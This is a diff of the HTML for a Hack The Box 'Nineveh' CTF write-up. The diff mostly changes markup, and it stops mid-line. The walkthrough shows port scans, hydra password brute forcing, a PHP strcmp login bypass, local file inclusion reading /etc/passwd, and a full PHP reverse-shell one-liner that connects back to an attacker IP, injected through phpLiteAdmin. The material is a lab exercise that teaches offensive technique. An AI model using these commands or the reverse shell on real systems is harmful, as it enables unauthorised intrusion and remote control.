@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.38.2" />
+<meta name="generator" content="Hugo 0.78.1" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -155,7 +155,7 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "@type": "BlogPosting",
     "mainEntityOfPage":{
       "@type":"WebPage",
-      "@id":"https://alamot.github.io/"
+      "@id":"https:\/\/alamot.github.io\/"
     },
     "headline": "Nineveh write-up |  ",
     "image": {
@@ -169,14 +169,14 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
-      "image": "https://alamot.github.io/images/logo.png"
+      "image": "https:\/\/alamot.github.io\/images/logo.png"
     },
     "publisher": {
       "@type": "Organization",
       "name": "",
       "logo": {
         "@type": "ImageObject",
-        "url": "https://alamot.github.io/images/logo.png",
+        "url": "https:\/\/alamot.github.io\/images/logo.png",
         "height": 60,
         "width": 60
       }
@@ -322,7 +322,7 @@ if (language) {
 <h2 id="port-scanning">Port scanning</h2>
 
 <p>We scan the full range of TCP ports using masscan:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.43
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.43
 Password: 
 
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2017-12-17 09:45:27 GMT
@@ -330,10 +330,10 @@ Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2017-12-17 09:45:27 GMT
 Initiating SYN Stealth Scan
 Scanning 1 hosts [65536 ports/host]
 Discovered open port 80/tcp on 10.10.10.43                                     
-Discovered open port 443/tcp on 10.10.10.43 </code></pre></div></div></p>
+Discovered open port 443/tcp on 10.10.10.43 </code></pre></div></p>
 
 <p>We found TCP ports 80 and 443 open. Let&rsquo;s explore them using nmap:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nmap -A -p80,443 10.10.10.43
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nmap -A -p80,443 10.10.10.43
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-17 11:48 EET
 Nmap scan report for 10.10.10.43
@@ -350,19 +350,19 @@ PORT    STATE SERVICE  VERSION
 |_Not valid after:  2018-07-01T15:03:30
 |_ssl-date: TLS randomness does not represent time
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Aggressive OS guesses: Linux 3.2 - 4.8 (91%), Crestron XPanel control system (89%)</code></pre></div></div></p>
+Aggressive OS guesses: Linux 3.2 - 4.8 (91%), Crestron XPanel control system (89%)</code></pre></div></p>
 
 <p>We see from ssl-cert the name nineveh.htb, so we add it to the /etc/hosts:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cat /etc/hosts
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ cat /etc/hosts
 ...
 10.10.10.43 nineveh.htb
-...</code></pre></div></div></p>
+...</code></pre></div></p>
 
 <h2 id="brute-forcing-directories-and-files">Brute forcing directories and files</h2>
 
 <h3 id="http-website-port-80">HTTP website (port 80)</h3>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirb http://nineveh.htb/ /usr/share/dirb/wordlists/big.txt 
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ dirb http://nineveh.htb/ /usr/share/dirb/wordlists/big.txt 
 -----------------
 DIRB v2.22    
 By The Dark Raver
@@ -378,11 +378,11 @@ GENERATED WORDS: 20458
 ---- Scanning URL: http://nineveh.htb/ ----
 + http://nineveh.htb/index.html (CODE:200|SIZE:178)                                                                
 + http://nineveh.htb/info.php (CODE:200|SIZE:83769)                                                                
-+ http://nineveh.htb/server-status (CODE:403|SIZE:299)</code></pre></div></div>
++ http://nineveh.htb/server-status (CODE:403|SIZE:299)</code></pre></div>
 
 <h3 id="https-website-port-443">HTTPS website (port 443)</h3>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirsearch -u https://nineveh.htb -w /opt/DirBuster/directory-list-2.3-medium.txt -e php
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ dirsearch -u https://nineveh.htb -w /opt/DirBuster/directory-list-2.3-medium.txt -e php
 Extensions: php | Threads: 10 | Wordlist size: 220521
 Target: https://nineveh.htb
 
@@ -390,7 +390,7 @@ Target: https://nineveh.htb
 [14:29:07] 200 -   49B  - /
 [14:29:17] 301 -  309B  - /db  -&gt;  https://nineveh.htb/db/
 [14:48:14] 403 -  300B  - /server-status
-[14:48:17] 301 -  319B  - /secure_notes  -&gt;  https://nineveh.htb/secure_notes/</code></pre></div></div>
+[14:48:17] 301 -  319B  - /secure_notes  -&gt;  https://nineveh.htb/secure_notes/</code></pre></div>
 
 <h1 id="getting-shell">Getting shell</h1>
 
@@ -398,7 +398,7 @@ Target: https://nineveh.htb
 
 <p>We visit this URL <a href="http://nineveh.htb/department/" target="_blank">http://nineveh.htb/department/</a> and we meet a login page. There is a different answer if a username exists (&lsquo;Invalid Password!&rsquo; vs &lsquo;Invalid username&rsquo;). This allows us to enum users and verify that user &lsquo;admin&rsquo; exists. We could brute force the password for user admin using hydra and rockyou.txt:</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ hydra 10.10.10.43 -l admin -P /usr/share/dict/rockyou.txt http-post-form &#34;/department/login.php:username=^USER^&amp;password=^PASS^:Invalid Password!&#34; 
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ hydra 10.10.10.43 -l admin -P /usr/share/dict/rockyou.txt http-post-form &#34;/department/login.php:username=^USER^&amp;password=^PASS^:Invalid Password!&#34; 
 Hydra v8.5 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (http://www.thc.org/thc-hydra) starting at 2017-12-17 12:17:11
@@ -410,7 +410,7 @@ Hydra (http://www.thc.org/thc-hydra) starting at 2017-12-17 12:17:11
 
 [80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
 1 of 1 target successfully completed, 1 valid password found
-Hydra (http://www.thc.org/thc-hydra) finished at 2017-12-17 12:23:13</code></pre></div></div>
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-12-17 12:23:13</code></pre></div>
 
 <p>But I prefer a more elegant solution. Instead of POSTing a password string:</p>
 
@@ -424,8 +424,8 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2017-12-17 12:23:13</code></pre
 strcmp(array(), &ldquo;thePassword&rdquo;) -&gt; NULL</p>
 
 <p>Here is the relevant source code for reference:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">amrois@nineveh:/var/www/html/department$ cat login.php</code></pre></div></div>
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">amrois@nineveh:/var/www/html/department$ cat login.php</code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 
 <span class="nx">session_start</span><span class="p">();</span>
 <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])){</span>                        
@@ -487,9 +487,9 @@ amrois:x:1000:1000:,,,:/home/amrois:/bin/bash
 <p><a href="http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../etc/passwd" target="_blank">http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../etc/passwd</a></p>
 
 <p>Here is the relevant source code for reference:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">amrois@nineveh:/var/www/html/department$ cat login.php</code></pre></div></div>
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">...
-<span class="cp">&lt;?php</span>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">amrois@nineveh:/var/www/html/department$ cat login.php</code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">...</span>
+<span class="o">&lt;?</span><span class="nx">php</span>
   <span class="nv">$file</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;notes&#39;</span><span class="p">];</span>
   <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">55</span><span class="p">)</span>
      <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;File name too long.&#34;</span><span class="p">);</span>
@@ -499,9 +499,9 @@ amrois:x:1000:1000:,,,:/home/amrois:/bin/bash
   <span class="k">echo</span> <span class="s2">&#34;&lt;pre&gt;&#34;</span><span class="p">;</span>
   <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
   <span class="k">echo</span> <span class="s2">&#34;&lt;/pre&gt;&#34;</span><span class="p">;</span>
-<span class="cp">?&gt;</span>
-...
-</code></pre></div></p>
+<span class="cp">?&gt;</span><span class="err">
+</span><span class="err">...
+</span></code></pre></div></p>
 
 <p>It&rsquo;s time for some simple maths:
 a) We have a LFI (<a href="http://nineveh.htb/department/manage.php?notes=" target="_blank">http://nineveh.htb/department/manage.php?notes=</a>)
@@ -518,7 +518,7 @@ b) We have phpinfo() (<a href="http://nineveh.htb/info.php" target="_blank">http
 <a href="https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Nineveh/lfiphpinfo.py" target="_blank">https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Nineveh/lfiphpinfo.py</a></p>
 
 <p>Don&rsquo;t forget to change LHOST, LPORT inside the script and to setup your listener:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ nc -lvp 60001</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ nc -lvp 60001</code></pre></div></p>
 
 <p>Usage: python2 ./lfiphpinfo.py 10.10.10.43 80 number_of_threads</p>
 
@@ -527,15 +527,15 @@ b) We have phpinfo() (<a href="http://nineveh.htb/info.php" target="_blank">http
 <h2 id="getting-shell-using-phpliteadmin">Getting shell using PHPLiteAdmin</h2>
 
 <p>If we visit URL <a href="https://nineveh.htb/db/" target="_blank">https://nineveh.htb/db/</a> we see a login page for phpLiteAdmin 1.9. Let&rsquo;s search exploits for this:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ searchsploit phpLiteAdmin 1.9 -w 
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ searchsploit phpLiteAdmin 1.9 -w 
 
 PHPLiteAdmin 1.9.3 - Remote PHP Code Injection https://www.exploit-db.com/exploits/24044/
-phpLiteAdmin 1.9.6 - Multiple Vulnerabilitiesh ttps://www.exploit-db.com/exploits/39714/</code></pre></div></div></p>
+phpLiteAdmin 1.9.6 - Multiple Vulnerabilitiesh ttps://www.exploit-db.com/exploits/39714/</code></pre></div></p>
 
 <p>Remote PHP Code Injection: &ldquo;An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.&rdquo;</p>
 
 <p>So we have to login first and then we can inject PHP code in the sqlite database. Let&rsquo;s try some brute force (username doesn&rsquo;t matter in this case):
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ hydra 10.10.10.43 -l user -P /usr/share/SecLists/Passwords/phpbb.txt https-post-form &#34;/db/index.php:password=^PASS^&amp;proc_login=true:Incorrect password&#34;
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ hydra 10.10.10.43 -l user -P /usr/share/SecLists/Passwords/phpbb.txt https-post-form &#34;/db/index.php:password=^PASS^&amp;proc_login=true:Incorrect password&#34;
 
 Hydra (http://www.thc.org/thc-hydra) starting at 2017-12-17 13:03:16
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 184365 login tries (l:1/p:184365), ~11523 tries per task
@@ -546,7 +546,7 @@ Hydra (http://www.thc.org/thc-hydra) starting at 2017-12-17 13:03:16
 [STATUS] 224.29 tries/min, 1570 tries in 00:07h, 182795 to do in 13:36h, 16 active
 [443][http-post-form] host: 10.10.10.43   login: user   password: password123
 1 of 1 target successfully completed, 1 valid password found
-Hydra (http://www.thc.org/thc-hydra) finished at 2017-12-17 13:10:44</code></pre></div></div></p>
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-12-17 13:10:44</code></pre></div></p>
 
 <p>We login and then:</p>
 
@@ -558,12 +558,12 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2017-12-17 13:10:44</code></pre
 </ol>
 
 <p>Here, for example, I use the code from <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank">http://pentestmonkey.net/tools/web-shells/php-reverse-shell</a> converted to one-liner by me ^_^:
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nx">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">&#34;1.0&#34;</span><span class="p">;</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="s2">&#34;10.10.15.203&#34;</span><span class="p">;</span> <span class="nv">$port</span> <span class="o">=</span> <span class="mi">60002</span><span class="p">;</span> <span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span> <span class="nv">$write_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span> <span class="nv">$error_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span> <span class="nv">$shell</span> <span class="o">=</span> <span class="s2">&#34;uname -a; w; id; /bin/bash -i&#34;</span><span class="p">;</span> <span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nx">function_exists</span><span class="p">(</span><span class="s2">&#34;pcntl_fork&#34;</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$pid</span> <span class="o">=</span> <span class="nx">pcntl_fork</span><span class="p">();</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Cannot fork&#34;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span> <span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nx">posix_setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;Error: Cannot setsid()&#34;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;</span><span class="p">);</span> <span class="p">}</span> <span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">);</span> <span class="nx">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nv">$sock</span> <span class="o">=</span> <span class="nx">fsockopen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$errstr</span><span class="s2"> (</span><span class="si">$errno</span><span class="s2">)&#34;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">),</span> <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">),</span> <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">));</span> <span class="nv">$process</span> <span class="o">=</span> <span class="nx">proc_open</span><span class="p">(</span><span class="nv">$shell</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Cannot spawn shell&#34;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span> <span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span> <span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span> <span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;Successfully opened reverse shell to </span><span class="si">$ip</span><span class="s2">:</span><span class="si">$port</span><span class="s2">&#34;</span><span class="p">);</span> <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Shell connection terminated&#34;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Shell process terminated&#34;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="nv">$read_a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> <span class="nv">$num_changed_sockets</span> <span class="o">=</span> <span class="nx">stream_select</span><span class="p">(</span><span class="nv">$read_a</span><span class="p">,</span> <span class="nv">$write_a</span><span class="p">,</span> <span class="nv">$error_a</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;SOCK READ&#34;</span><span class="p">);</span> <span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$chunk_size</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;SOCK: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$input</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDOUT READ&#34;</span><span class="p">);</span> <span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDOUT: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDERR READ&#34;</span><span class="p">);</span> <span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDERR: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span> <span class="p">}</span> <span class="p">}</span> <span class="nx">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span> <span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> <span class="nx">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span> <span class="k">function</span> <span class="nf">printit</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$daemon</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="s2">&#34;</span><span class="si">$string\n</span><span class="s2">&#34;</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="cp">?&gt;</span>
-</code></pre></div></p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">&#34;1.0&#34;</span><span class="p">;</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="s2">&#34;10.10.15.203&#34;</span><span class="p">;</span> <span class="nv">$port</span> <span class="o">=</span> <span class="mi">60002</span><span class="p">;</span> <span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span> <span class="nv">$write_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span> <span class="nv">$error_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span> <span class="nv">$shell</span> <span class="o">=</span> <span class="s2">&#34;uname -a; w; id; /bin/bash -i&#34;</span><span class="p">;</span> <span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nx">function_exists</span><span class="p">(</span><span class="s2">&#34;pcntl_fork&#34;</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$pid</span> <span class="o">=</span> <span class="nx">pcntl_fork</span><span class="p">();</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Cannot fork&#34;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span> <span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nx">posix_setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;Error: Cannot setsid()&#34;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;</span><span class="p">);</span> <span class="p">}</span> <span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">);</span> <span class="nx">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nv">$sock</span> <span class="o">=</span> <span class="nx">fsockopen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$errstr</span><span class="s2"> (</span><span class="si">$errno</span><span class="s2">)&#34;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">),</span> <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">),</span> <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">));</span> <span class="nv">$process</span> <span class="o">=</span> <span class="nx">proc_open</span><span class="p">(</span><span class="nv">$shell</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Cannot spawn shell&#34;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span> <span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span> <span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span> <span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span 